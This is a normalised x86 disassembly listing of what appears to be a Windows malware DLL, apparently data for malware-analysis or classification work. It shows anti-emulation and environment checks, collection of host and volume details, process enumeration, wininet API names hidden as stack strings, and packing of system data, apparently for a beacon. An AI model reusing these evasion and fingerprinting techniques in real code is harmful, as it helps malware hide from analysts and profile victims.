mov ebp esp
push ecx
fwait
fninit
push 0x1e240
push 0x0
fild [ esp ]
movq [ esp ] mm7
pop eax
pop eax
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0xf1200000
setne al
leave
retn
sub_100047eb
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
lea eax [ ebp - 0x4 ]
push eax
call [ GetCurrentProcess@IAT ]
push eax
call [ IsWow64Process@IAT ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0xa
push r--data
call [ esi ]
cmp [ ebp - 0x4 ] 0x0
pop esi
sete al
dec al
and al 0x20
add al 0x20
leave
retn
sub_10004839
push ebp
mov ebp esp
sub esp 0x28
push ebx
push esi
push edi
mov edi 0x9c
push edi
call sub_100046cb
mov esi eax
pop ecx
push esi
mov [ esi ] edi
call [ GetVersionExA@IAT ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edi [ GetLastError@IAT ]
mov [ ebp - 0x4 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push r--data
push 0x1
push 0xb
mov ebx r--data
push ebx
call [ eax ]
lea eax [ ebp - 0x28 ]
push eax
call [ GetSystemInfo@IAT ]
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push r--data
push 0x1
push 0xc
push ebx
call [ eax ]
mov eax [ esi + 0x4 ]
xor ebx ebx
cmp eax 0x5
jne r-xdata
cmp eax 0x6
jne r-xdata
mov eax [ esi + 0x8 ]
sub eax ebx
je r-xdata
push esi
call sub_100046eb
pop ecx
pop edi
pop esi
mov al bl
pop ebx
leave
retn
cmp [ esi + 0x9a ] 0x1
mov eax [ esi + 0x8 ]
jne r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
sub eax ebx
je r-xdata
sub eax ebx
je r-xdata
mov bl 0x2
jmp r-xdata
dec eax
jne r-xdata
mov bl 0xb
dec eax
je r-xdata
mov bl 0x7
jmp r-xdata
dec eax
je r-xdata
cmp [ esi + 0x9a ] 0x1
jne r-xdata
mov bl 0xc
jmp r-xdata
dec eax
je r-xdata
mov bl 0x8
jmp r-xdata
dec eax
je r-xdata
mov eax 0x8000
test [ esi + 0x98 ] ax
je r-xdata
cmp [ ebp - 0x28 ] 0x9
jne r-xdata
mov bl 0xd
jmp r-xdata
dec eax
jne r-xdata
push ebx
push 0x3
push 0x6
call sub_10004715
add esp 0xc
test al al
setne bl
add bl 0x9
jmp r-xdata
dec eax
jne r-xdata
mov edi [ GetSystemMetrics@IAT ]
push 0x59
call edi
test eax eax
jne r-xdata
mov bl 0x4
jmp r-xdata
mov bl 0x3
jmp r-xdata
mov bl 0xe
jmp r-xdata
mov bl 0xa
jmp r-xdata
push 0x59
call edi
test eax eax
je r-xdata
mov bl 0x5
jmp r-xdata
mov bl 0x6
jmp r-xdata
sub_10004989
push ebp
mov ebp esp
sub esp 0xc
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push edi
lea eax [ ebp - 0x4 ]
push eax
mov esi r--data
push esi
push 0x0
call ObtainUserAgentString
mov eax [ rw-data ]
mov eax [ eax ]
mov edi [ GetLastError@IAT ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0xd
mov ebx r--data
push ebx
call [ eax ]
push [ ebp - 0x4 ]
call sub_100046e2
pop ecx
lea ecx [ ebp - 0x4 ]
push ecx
push eax
push 0x0
mov [ ebp - 0xc ] eax
call ObtainUserAgentString
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0xe
push ebx
call [ eax ]
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
leave
retn
sub_10004a0e
push ebp
mov ebp esp
push ecx
push esi
xor eax eax
push eax
push eax
push eax
push eax
lea ecx [ ebp - 0x4 ]
push ecx
push eax
push eax
push eax
mov [ ebp - 0x4 ] eax
call [ GetVolumeInformationA@IAT ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0xf
push r--data
call [ esi ]
mov eax [ ebp - 0x4 ]
pop esi
leave
retn
sub_10004a53
push ebp
mov ebp esp
sub esp 0x14
push 0xc
call sub_100046cb
pop ecx
test eax eax
je r-xdata
and [ ebp - 0x8 ] 0x0
mov ecx eax
call sub_10003cb8
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x14 ] edi
je r-xdata
call sub_10004024
push [ ebp - 0x8 ]
call sub_100046eb
pop ecx
mov ecx [ ebp - 0x8 ]
push ebx
push esi
push edi
push 0x2b
push r--data
call sub_10003fd4
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push [ ebp - 0x4 ]
mov edi [ eax ]
call [ lstrlenA@IAT ]
mov ecx [ rw-data ]
push eax
push [ ebp - 0x4 ]
xor ebx ebx
inc ebx
push ebx
push 0x10
mov esi r--data
push esi
call [ edi ]
lea eax [ ebp - 0x10 ]
push eax
push ebx
xor edi edi
push edi
push [ ebp - 0x4 ]
push 0x80000002
call [ RegOpenKeyExA@IAT ]
mov ecx [ rw-data ]
mov edx [ ecx ]
push eax
push r--data
push ebx
push 0x11
push esi
mov [ ebp - 0x14 ] eax
call [ edx ]
push [ ebp - 0x4 ]
call sub_1000470c
pop ecx
mov ecx [ ebp - 0x8 ]
cmp ecx edi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push edi
push edi
push edi
mov edi [ RegQueryValueExA@IAT ]
mov [ ebp - 0xc ] ebx
mov ebx r--data
push ebx
push [ ebp - 0x10 ]
call edi
push [ ebp - 0xc ]
mov ecx [ rw-data ]
mov eax [ ecx ]
push r--data
push 0x1
push 0x14
push esi
call [ eax ]
push [ ebp - 0xc ]
call sub_100046e2
pop ecx
lea ecx [ ebp - 0xc ]
push ecx
push eax
push 0x0
push 0x0
push ebx
push [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
call edi
mov ecx [ rw-data ]
mov edx [ ecx ]
push eax
push [ ebp - 0x14 ]
push 0x1
push 0x15
push esi
call [ edx ]
push [ ebp - 0x10 ]
call [ RegCloseKey@IAT ]
mov eax [ ebp - 0x14 ]
push 0x401
call sub_100046e2
push [ ebp - 0x14 ]
mov esi eax
push r--data
push esi
call [ wsprintfA@IAT ]
add esp 0x10
mov eax esi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_10004b95
push ebp
mov ebp esp
sub esp 0x138
push esi
call sub_100047c5
test al al
je r-xdata
push 0xc
call sub_100046cb
pop ecx
test eax eax
je r-xdata
mov eax [ rw-data ]
mov esi [ eax ]
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0x1
push r--data
call [ esi ]
xor eax eax
jmp r-xdata
and [ ebp - 0x8 ] 0x0
mov ecx eax
call sub_10003cb8
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop esi
leave
retn
push 0x0
push 0x2
call [ ebp - 0x10 ]
lea ecx [ ebp - 0x138 ]
push ecx
push eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x138 ] 0x128
call Process32First
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x5
push edi
call [ eax ]
and [ ebp - 0x8 ] 0x0
call sub_10004024
push [ ebp - 0x8 ]
call sub_100046eb
pop ecx
mov ecx [ ebp - 0x8 ]
push ebx
push edi
push 0x18
push r--data
call sub_10003fd4
mov esi [ GetLastError@IAT ]
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
mov ebx r--data
push ebx
push 0x1
push 0x2
mov edi r--data
push edi
call [ eax ]
push r--data
call [ GetModuleHandleA@IAT ]
push [ ebp - 0xc ]
push eax
call [ GetProcAddress@IAT ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x3
push edi
call [ eax ]
push [ ebp - 0xc ]
call sub_1000470c
pop ecx
mov ecx [ ebp - 0x8 ]
test ecx ecx
je r-xdata
lea eax [ ebp - 0x114 ]
push eax
call [ lstrlenA@IAT ]
mov ecx [ ebp - 0x8 ]
lea eax [ ecx + eax + 0x1 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x138 ]
push eax
push [ ebp - 0xc ]
call Process32Next
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x6
push edi
call [ eax ]
mov eax [ ebp - 0x8 ]
inc eax
push eax
call sub_100046e2
and [ ebp - 0x8 ] 0x0
pop ecx
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x138 ]
push eax
push [ ebp - 0xc ]
call Process32First
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x7
push edi
call [ eax ]
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x10 ]
add eax [ ebp - 0x8 ]
push r--data
push eax
call [ wsprintfA@IAT ]
add [ ebp - 0x8 ] eax
add esp 0xc
lea eax [ ebp - 0x138 ]
push eax
push [ ebp - 0xc ]
call Process32Next
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x8
push edi
call [ eax ]
push [ ebp - 0xc ]
call [ CloseHandle@IAT ]
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x9
push edi
call [ eax ]
mov eax [ ebp - 0x10 ]
pop edi
pop ebx
sub_10004dda
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebp
retn 0x4
push eax
call sub_1000470c
pop ecx
sub_10004df9
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ esi + 0x8 ] eax
pop esi
pop ebp
retn 0x4
push eax
call sub_1000470c
pop ecx
sub_10004e18
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ esi + 0xc ] eax
pop esi
pop ebp
retn 0x4
push eax
call sub_1000470c
pop ecx
sub_10004e37
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100046eb
pop ecx
sub_10004e57
push esi
push 0xc
mov esi ecx
call sub_100046cb
pop ecx
test eax eax
je r-xdata
xor eax eax
mov ecx eax
call sub_10003cb8
jmp r-xdata
xor eax eax
mov ecx eax
call sub_10003b8d
jmp r-xdata
push 0x1
mov [ esi + 0x4 ] eax
call sub_100046cb
pop ecx
test eax eax
je r-xdata
and [ esi + 0x10 ] 0x0
and [ esi + 0x8 ] 0x0
and [ esi + 0xc ] 0x0
push 0x28
mov [ esi ] eax
call sub_100046e2
mov [ esi + 0x1c ] eax
pop ecx
mov eax esi
pop esi
retn
sub_10004ea8
push ebp
mov ebp esp
mov eax [ ecx + 0x1c ]
xor edx edx
mov ecx eax
mov ecx [ ebp + 0x8 ]
mov [ eax + edx * 4 ] ecx
inc edx
add ecx 0x4
cmp edx 0xa
jl r-xdata
cmp [ ecx ] 0x0
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
push esi
mov esi [ eax ]
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0x6
push r--data
call [ esi ]
pop esi
pop ebp
retn 0x4
sub_10004ef2
push esi
mov esi ecx
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
push 0x2c
push r--data
call sub_10003fd4
mov [ esi + 0xc ] eax
mov eax [ rw-data ]
mov esi [ eax ]
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0x7
push r--data
call [ esi ]
pop esi
retn
push eax
call sub_1000470c
pop ecx
sub_10004f3b
push ebp
mov ebp esp
sub esp 0x1c
and [ ebp - 0x18 ] 0x0
and [ ebp - 0x14 ] 0x0
push ebx
push esi
mov esi [ GetLastError@IAT ]
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x10 ] r--data
mov ebx r--data
mov edi r--data
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
push eax
call sub_1000470c
mov eax [ ebp - 0x8 ]
and [ eax + 0xc ] 0x0
mov eax [ rw-data ]
mov eax [ eax ]
pop ecx
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x8
push edi
call [ eax ]
add [ ebp - 0x14 ] 0x2c
inc [ ebp - 0x18 ]
add [ ebp - 0x10 ] 0x2c
cmp [ ebp - 0x14 ] 0xb0
jb r-xdata
push [ ebp - 0xc ]
call sub_1000470c
mov eax [ rw-data ]
mov eax [ eax ]
pop ecx
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0xc
push edi
call [ eax ]
mov eax [ ebp - 0x18 ]
push 0x2c
cmp eax 0x3
jne r-xdata
push [ ebp - 0xc ]
call sub_1000470c
mov eax [ rw-data ]
mov eax [ eax ]
pop ecx
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x9
push edi
call [ eax ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x4 ]
push 0x2c
push [ ebp - 0x10 ]
call sub_10003fd4
push eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
push [ eax + 0xc ]
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
jmp r-xdata
inc eax
and eax 0x3
imul eax eax 0x2c
add eax r--data
push eax
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x4 ]
call sub_10003fd4
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0xb
push edi
call [ eax ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x4 ]
push r--data
call sub_10003fd4
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0xa
push edi
call [ eax ]
and [ ebp - 0x1c ] 0x0
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0xd
push edi
call [ eax ]
mov eax [ ebp - 0x1c ]
pop edi
pop esi
pop ebx
leave
retn
sub_100050e0
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
push 0x2
mov [ ebp - 0x8 ] ecx
mov ecx [ ecx + 0x4 ]
push r--data
call sub_10003fd4
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov esi [ eax ]
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0x28
push r--data
call [ esi ]
mov esi [ lstrlenA@IAT ]
push r--data
call esi
push [ ebp - 0x4 ]
mov edi eax
imul edi edi 0x3
call esi
push [ ebp + 0x8 ]
add edi eax
call esi
push [ ebp + 0xc ]
add edi eax
call esi
lea eax [ eax + edi + 0x5 ]
push eax
call sub_100046e2
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
push [ ebp - 0x4 ]
push r--data
push ebx
call [ wsprintfA@IAT ]
mov edi eax
mov eax [ ebp - 0x8 ]
add eax 0x10
push 0x4
push eax
lea eax [ edi + ebx ]
push eax
call sub_10004144
push [ ebp + 0x8 ]
add edi 0x4
lea eax [ edi + ebx ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0x24
push [ ebp + 0xc ]
add edi eax
call esi
push eax
push [ ebp + 0xc ]
lea eax [ edi + ebx ]
push eax
call sub_10004144
add esp 0xc
push [ ebp + 0xc ]
call esi
add edi eax
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x4 ]
push 0x1
push edi
push ebx
call sub_10003d0c
mov edi eax
mov eax [ rw-data ]
mov esi [ eax ]
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0x29
push r--data
call [ esi ]
push ebx
call sub_1000470c
push [ ebp - 0x4 ]
call sub_1000470c
pop ecx
pop ecx
mov eax edi
sub_10005202
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ lstrlenA@IAT ]
push edi
push [ ebp + 0xc ]
call esi
push [ ebp + 0x10 ]
lea edi [ eax + 0x1 ]
call esi
mov esi [ InternetSetOptionA@IAT ]
push edi
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push 0x2b
push [ ebp + 0x8 ]
call esi
mov eax [ rw-data ]
mov eax [ eax ]
mov edi [ GetLastError@IAT ]
mov [ ebp + 0xc ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp + 0xc ]
push r--data
push 0x1
push 0x3c
mov ebx r--data
push ebx
call [ eax ]
mov eax [ ebp - 0x4 ]
inc eax
push eax
push [ ebp + 0x10 ]
push 0x2c
push [ ebp + 0x8 ]
call esi
mov [ ebp + 0xc ] eax
mov eax [ rw-data ]
mov esi [ eax ]
call edi
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0x3d
push ebx
call [ esi ]
mov eax [ ebp + 0xc ]
pop edi
pop esi
pop ebx
leave
retn 0xc
sub_10005295
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x1 ] 0x0
xor edi edi
mov eax [ rw-data ]
mov esi [ eax ]
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0x3e
push r--data
call [ esi ]
jmp r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x4 ]
test al al
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
mov edi [ eax ]
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0x3f
push r--data
call [ edi ]
mov [ ebx + 0x20 ] esi
mov [ ebp - 0x1 ] 0x1
add edi 0x4
cmp edi 0x28
jl r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ edi + eax ]
test esi esi
je r-xdata
jmp r-xdata
sub_1000531c
push edi
mov edi ecx
cmp [ edi + 0x20 ] 0x0
je r-xdata
xor eax eax
pop edi
retn
mov eax [ rw-data ]
push esi
mov esi [ eax ]
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0x40
push r--data
call [ esi ]
mov ecx [ edi + 0x20 ]
mov eax [ ecx ]
pop esi
pop edi
jmp [ eax + 0x8 ]
sub_10005358
push edi
mov edi ecx
cmp [ edi + 0x20 ] 0x0
je r-xdata
xor eax eax
pop edi
retn
mov eax [ rw-data ]
push esi
mov esi [ eax ]
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0x41
push r--data
call [ esi ]
mov ecx [ edi + 0x20 ]
mov eax [ ecx ]
pop esi
pop edi
jmp [ eax + 0xc ]
sub_10005394
push edi
mov edi ecx
cmp [ edi + 0x20 ] 0x0
je r-xdata
xor eax eax
pop edi
retn
mov eax [ rw-data ]
push esi
mov esi [ eax ]
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0x42
push r--data
call [ esi ]
mov ecx [ edi + 0x20 ]
mov eax [ ecx ]
pop esi
pop edi
jmp [ eax + 0x10 ]
sub_100053d0
push ebp
mov ebp esp
sub esp 0x294
lea eax [ ebp - 0x294 ]
push eax
push 0x202
call WSAStartup
push 0x103
lea eax [ ebp - 0x103 ]
push 0x0
push eax
mov [ ebp - 0x104 ] 0x0
call sub_10004195
add esp 0xc
push 0x104
lea eax [ ebp - 0x104 ]
push eax
call gethostname
test eax eax
jne r-xdata
xor al al
leave
retn
lea eax [ ebp - 0x104 ]
push eax
call gethostbyname
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
xor edx edx
cmp [ eax ] edx
je r-xdata
mov al 0x1
leave
retn
mov ecx eax
inc edx
lea ecx [ eax + edx * 4 ]
cmp [ ecx ] 0x0
jne r-xdata
cmp ecx 0xb29bfea9
jne r-xdata
mov ecx [ ecx ]
mov ecx [ ecx ]
cmp ecx 0x100007f
je r-xdata
sub_1000545c
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
test eax eax
je r-xdata
push eax
call sub_1000470c
pop ecx
mov eax [ esi + 0x8 ]
and [ esi + 0xc ] 0x0
test eax eax
je r-xdata
push eax
call sub_1000470c
pop ecx
and [ esi + 0x8 ] 0x0
mov eax esi
pop esi
retn
push eax
call sub_1000470c
pop ecx
sub_1000549f
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10006ffc
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100046eb
pop ecx
sub_100054be
push esi
mov esi ecx
mov eax [ esi + 0xc ]
push edi
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call sub_1000470c
pop ecx
mov edi [ esi ]
test edi edi
je r-xdata
push eax
call sub_1000470c
pop ecx
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
mov ecx edi
call sub_10003b90
push edi
call sub_100046eb
pop ecx
xor edi edi
mov ecx edi
call sub_10004024
push edi
call sub_100046eb
pop ecx
add edi 0x4
cmp edi 0x28
jl r-xdata
mov eax [ eax + edi ]
test eax eax
je r-xdata
mov eax [ esi + 0x1c ]
cmp [ eax + edi ] 0x0
je r-xdata
push [ esi + 0x1c ]
call sub_100046eb
pop ecx
pop edi
pop esi
retn
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_10005535
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
mov esi ecx
mov ecx [ esi ]
push edi
mov [ ebp - 0x8 ] esi
call sub_10004a0e
mov ecx [ esi ]
mov [ esi + 0x10 ] eax
call sub_10004989
push 0x10
mov [ esi + 0x8 ] eax
call sub_100046cb
pop ecx
test eax eax
je r-xdata
and [ ebp - 0xc ] 0x0
mov ecx eax
call sub_1000545c
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ GetLastError@IAT ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
mov ebx r--data
push ebx
push 0x1
push 0x1
mov edi r--data
push edi
call [ eax ]
push [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
call sub_10004ea8
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x2
push edi
call [ eax ]
lea eax [ ebp - 0x18 ]
push eax
mov [ ebp - 0x18 ] 0x696e6977
mov [ ebp - 0x14 ] 0x2e74656e
mov [ ebp - 0x10 ] 0x6c6c64
call [ GetModuleHandleA@IAT ]
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x3
push edi
call [ eax ]
lea eax [ ebp - 0x40 ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x65746e49
mov [ ebp - 0x3c ] 0x74656e72
mov [ ebp - 0x38 ] 0x736f6c43
mov [ ebp - 0x34 ] 0x6e614865
mov [ ebp - 0x30 ] 0x656c64
call [ GetProcAddress@IAT ]
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x25 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x4
push edi
call [ eax ]
lea eax [ ebp - 0x2c ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x2c ] 0x65746e49
mov [ ebp - 0x28 ] 0x74656e72
mov [ ebp - 0x24 ] 0x64616552
mov [ ebp - 0x20 ] 0x656c6946
mov [ ebp - 0x1c ] 0x0
call [ GetProcAddress@IAT ]
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x29 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x5
push edi
call [ eax ]
pop edi
pop esi
mov al 0x1
pop ebx
leave
retn
sub_100056b6
push ebp
mov ebp esp
sub esp 0x30
push ebx
push esi
push edi
mov edi ecx
mov ecx [ edi ]
call sub_10004839
mov ebx [ GetLastError@IAT ]
mov [ ebp - 0x1 ] al
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call ebx
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
mov esi r--data
push esi
push 0x1
push 0xe
push r--data
call [ eax ]
mov ecx [ edi ]
call sub_100047eb
mov [ ebp - 0x2 ] al
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call ebx
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0xf
push r--data
call [ eax ]
mov ecx [ edi ]
call sub_10004b95
mov esi [ lstrlenA@IAT ]
push eax
mov [ ebp - 0x1c ] eax
call esi
mov [ ebp - 0x28 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call ebx
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push r--data
push 0x1
push 0x10
push r--data
call [ eax ]
mov ecx [ edi ]
call sub_10004a53
push eax
mov [ ebp - 0x18 ] eax
call esi
mov ecx edi
mov [ ebp - 0x24 ] eax
call sub_1000531c
mov ecx edi
mov [ ebp - 0xc ] eax
call sub_10005358
mov ecx edi
mov [ ebp - 0x8 ] eax
call sub_10005394
push eax
mov [ ebp - 0x30 ] eax
call esi
push [ ebp - 0x8 ]
mov ebx eax
call esi
push [ ebp - 0xc ]
add ebx eax
call esi
push r--data
add ebx eax
call esi
add eax ebx
push r--data
mov [ ebp - 0x14 ] eax
call esi
mov ecx [ edi + 0x4 ]
mov ebx eax
add ebx [ ebp - 0x14 ]
push 0x5
push r--data
mov [ ebp - 0x2c ] ebx
call sub_10003fd4
push eax
mov [ ebp - 0x14 ] eax
call esi
mov ecx [ edi + 0x4 ]
push 0x6
push r--data
mov [ ebp - 0x20 ] eax
call sub_10003fd4
push eax
mov [ ebp - 0x10 ] eax
call esi
add eax [ ebp - 0x20 ]
add eax ebx
add eax [ ebp - 0x24 ]
mov ebx [ ebp - 0x28 ]
lea eax [ eax + ebx + 0xf ]
push eax
call sub_100046e2
mov esi eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
push esi
call sub_10004144
push 0x1
lea eax [ ebp - 0x2 ]
push eax
lea eax [ esi + 0x1 ]
push eax
call sub_10004144
push ebx
push [ ebp - 0x1c ]
lea eax [ esi + 0x2 ]
push eax
call sub_10004144
push [ ebp - 0x18 ]
add ebx 0x2
push [ ebp - 0x14 ]
lea eax [ ebx + esi ]
push r--data
push eax
call [ wsprintfA@IAT ]
push 0x12131415
push [ ebp - 0x10 ]
add ebx eax
lea eax [ ebx + esi ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0x48
add ebx eax
cmp [ ebp - 0x2c ] 0x2
jle r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov ebx [ GetLastError@IAT ]
mov [ ebp - 0x8 ] eax
call ebx
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push r--data
